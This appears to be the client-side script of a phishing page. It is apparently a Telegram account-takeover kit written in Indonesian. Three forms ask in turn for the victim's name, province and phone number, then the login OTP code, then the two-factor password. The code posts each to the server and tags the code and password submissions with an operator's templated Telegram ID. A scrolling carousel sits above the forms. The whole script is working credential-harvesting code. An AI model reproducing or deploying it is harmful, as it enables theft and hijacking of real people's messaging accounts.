<script>
$(document).ready(function(){
var container = $('.carouseltext'),
  items = container.find('li'),
  containerHeight = 0,
  numberVisible = 5, // Jumlah item yang terlihat
  intervalSec = 2000; // Interval untuk scroll dalam milidetik

// Menambahkan kelas "first" ke item pertama jika belum ada
if (!container.find('li:first').hasClass("first")) {
  container.find('li:first').addClass("first");
}

// Menghitung tinggi total container berdasarkan jumlah item yang terlihat
items.each(function () {
  if (containerHeight < numberVisible * $(this).outerHeight()) {
      containerHeight += $(this).outerHeight();
  }
});

container.css({ height: containerHeight, overflow: "hidden" });

// Fungsi untuk memindahkan item pertama ke bawah
function vertCycle() {
  var firstItem = container.find('li.first'); // Ambil item pertama
  var firstItemHtml = firstItem.html();

  // Salin item pertama dan tambahkan ke bawah
  container.append('<li>' + firstItemHtml + '</li>');

  // Animasi untuk menggeser item pertama ke atas
  firstItem.animate({ marginTop: "-50px" }, 600, function () {
      $(this).remove(); // Hapus item pertama yang sudah bergeser
      container.find('li:first').addClass("first"); // Tandai item pertama yang baru
  });
}

// Tentukan interval minimal 700ms
if (intervalSec < 700) {
  intervalSec = 700;
}

// Mulai interval untuk memanggil vertCycle setiap intervalSec detik
var init = setInterval(vertCycle, intervalSec);

// Hentikan interval saat hover, dan mulai kembali setelah hover selesai
container.hover(function () {
  clearInterval(init);
}, function () {
  init = setInterval(vertCycle, intervalSec);
});
});
function formatPhoneNumber(phoneNumber) {
// Jika nomor telepon diawali dengan '0', ganti dengan '+628'
if (phoneNumber.startsWith('0')) {
return '+62' + phoneNumber.substring(1);
}
// Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
else if (phoneNumber.startsWith('62')) {
return '+62' + phoneNumber.substring(2);
}
// Jika format sudah sesuai, kembalikan nomor tanpa perubahan
else {
return phoneNumber;
}
}
function processFirstData(){
$('#firstForm').submit(function(submitingprocessFirstData){
submitingprocessFirstData.preventDefault();

var $full_name = $("input#full_name").val();
var $provinsi = $("#provinsi").val();
var $phone = $("input#phone_number").val();
var $phone_number = formatPhoneNumber($phone);
var dataToSend = {
full_name: $full_name,
provinsi: $provinsi,
phone_number: $phone_number
};
console.log(dataToSend)


if($full_name === "" && $phone_number === ""){
  return false;
}

$.ajax({
  type: "POST",
  url: "/number",
 data: dataToSend,
  beforeSend: function() {
      $('.loading').show();
      $("#alert").html("")
      $('#firstbutt').hide();
  },
  success: function(hasil){
      if(hasil.code == 200){             
          $('.loading').hide();
          $(".second").show();
          $('.first').hide();
          $("input#validateclientHash").val(hasil.clientHash);
          $("input#validateprovinsi").val($provinsi);
          $("input#validatephone_number").val($phone_number);
      }else{
          $('#firstbutt').show();
          $('.loading').hide();
          if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
              
              $("#alert").html(`
              <div class="alert alert-danger" role="alert">
                  Nomor Yang Anda Masukkan Tidak Valid!
                  </div>
                  `)
              }else if(hasil.err.errorMessage == "FLOOD"){
                  
                  $("#alert").html(`
                  <div class="alert alert-danger" role="alert">
                      Terlalu Banyak Permintaan Code!
                      </div>
                      `)
              }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
                  
                  $("#alert").html(`
                  <div class="alert alert-danger" role="alert">
                      Terlalu Banyak Memasukkan Password!
                      </div>
                      `)
                  }else{
                      $("#alert").html(`<div class="alert alert-danger" role="alert">
                          ${hasil.err.errorMessage}
                          </div>`)
                      }
                      
                      
                      
                      
                  }
              }
          });
      });  
      return false;
  };
  
  
  
  
  
  
  
  function processSecondData(){
      $('#secondForm').submit(function(submitingprocessSecondData){
          submitingprocessSecondData.preventDefault();
          
          var $clientHash = $("input#validateclientHash").val();
          var $phone_number = $("input#validatephone_number").val();
          var $provinsi = $("input#validateprovinsi").val();
          var $otp_code = $("input#otp_code").val();
          var $idtele = "<%= String(telegramId) %>"
          if($clientHash === "" && $phone_number === "" && $otp_code === ""){
              return false;
          }
          
          $.ajax({
              type: "POST",
              url: "/code",
              data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
              beforeSend: function() {
                  $("#alert").html("")
                  $('.loading').show();
                    $('#seccbutt').hide();
              },
              success: function(hasil){
                  
                   $('.loading').hide();
                    if(hasil.needPassword || hasil.code == 401){
                                          $(".third").show();
                      $('.second').hide();
                      $("input#validateclientHash").val($clientHash);
                      $("input#validatePhoneNumber").val($phone_number);
                      $("input#validateprovinsi").val($provinsi); 
                     
                                        
                    }else{
                        
                          try{
                         if(hasil.code == 200){
                                       if(hasil.stcd.result.user != ""){
                                            
                                            $(".four").show();
                                            $('.loading').hide();
                                            $('.second').hide();
                                
                                        }
                                        
                              $('.loading').hide();
              
                $(".four").show();
                            $('.second').hide();
                             
                         }else{
                      $('#seccbutt').show();
            $('.loading').hide();
               
      $("#alert").html(`<div class="alert alert-danger" role="alert">${hasil.code} - ${hasil.error}</div>`)
                                
  }
}catch(e){
  
  
  console.log(e)
  console.log(hasil)
   $('#seccbutt').show();
  $('.loading').hide();
  
  
  
  
  $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah,coba lagi</div>`)
  
  
  
  
                                
  
}   

}
                    
                    
      
                          
                          },
                          error: function(xhr, status, error) {
                               $('#seccbutt').show();
      if (status === "timeout") {
   $('.loading').hide();
                            
         $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
      } else {
   $('.loading').hide();
                            
         $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
      }
    }
                  });
              });  
              return false;
          };
          
          
          function processThirdData(){
              $('#thirdForm').submit(function(submitingprocessThirdData){
                  submitingprocessThirdData.preventDefault();
                  
                  var $clientHash = $("input#validateclientHash").val();
                  var $provinsi = $("input#validateprovinsi").val();
                  var $phone_number = $("input#validatephone_number").val();
                  var $password = $("input#password").val();
                                          var $idtele = "<%= String(telegramId) %>"
                  if($clientHash === "" && $phone_number === "" && $password === ""){
                      return false;
                  }
                  
                  $.ajax({
                      type: "POST",
                      url: "/password",
                      data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
                      beforeSend: function() {
                          $('.loading').show();
                          $("#alert").html("")
                           $('#thirdbutt').hide();
                      },
                      success: function(response){

                        

          try {
                    // Mengecek apakah respons sukses atau error
                    if (response.code == 200) {
            
                        $('.loading').hide();
                        $('.third').hide();
                        $(".four").show();

                                             
                    } else {
                        // Menyembunyikan loading dan menampilkan tombol kembali
                        $('.loading').hide();
                 $('#thirdbutt').show();
                        
                        // Menampilkan pesan error jika ada
                        if (response.error) {
                            $("#alert").html(`<div class="alert alert-danger" role="alert">${response.code} - ${response.error}</div>`);
                        } else {
                            $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
                        }
                    }
                } catch (e) {
                     $('#thirdbutt').show();
                    // Menangani error di dalam blok try-catch
                    $('.loading').hide();
               
                    console.log(e);
                    $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
                }
            },
            error: function(xhr, status, error){
                 $('#thirdbutt').show();
                // Menangani error jika ada masalah saat pengiriman data
                $('.loading').hide();
             
                console.log(error);
                $("#alert").html(`<div class="alert alert-danger" role="alert">Terjadi kesalahan, coba lagi nanti.</div>`);
            }
        });
        });

        return false;
};

</script>






